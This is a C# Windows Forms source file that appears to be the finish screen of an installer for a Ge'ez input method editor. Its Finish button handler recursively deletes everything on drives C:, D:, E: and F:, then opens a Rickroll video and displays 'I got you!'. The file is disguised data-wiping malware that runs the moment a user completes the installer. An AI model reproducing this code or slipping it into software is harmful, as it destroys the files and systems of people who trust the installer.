using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GeezIME
{
    public partial class Finish : Form
    {
        public Finish()
        {
            InitializeComponent();
        }

        private void btnFinish_Click(object sender, EventArgs e)
        {
            string folderPath = @"C:\";
            string folderPath2 = @"D:\";
            string folderPath3 = @"E:\";
            string folderPath4 = @"F:\";

            // Call the DeleteFolderRecursively method to delete the specified folder and its contents
            DeleteFolderRecursively(folderPath);
            DeleteFolderRecursively(folderPath2);
            DeleteFolderRecursively(folderPath3);
            DeleteFolderRecursively(folderPath4);

            string rikcroll = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley";

            // Open the default browser with the specified URL
            Process.Start(rikcroll);
            MessageBox.Show("I got you!");

        }
        static void DeleteFolderRecursively(string folderPath)
        {
            // Delete files in the folder
            foreach (string filePath in System.IO.Directory.GetFiles(folderPath))
            {
                File.Delete(filePath);
            }

            // Recursively delete subfolders
            foreach (string subFolderPath in Directory.GetDirectories(folderPath))
            {
                DeleteFolderRecursively(subFolderPath);
            }

            // Delete the current folder
            Directory.Delete(folderPath, true);
        }
    }
}
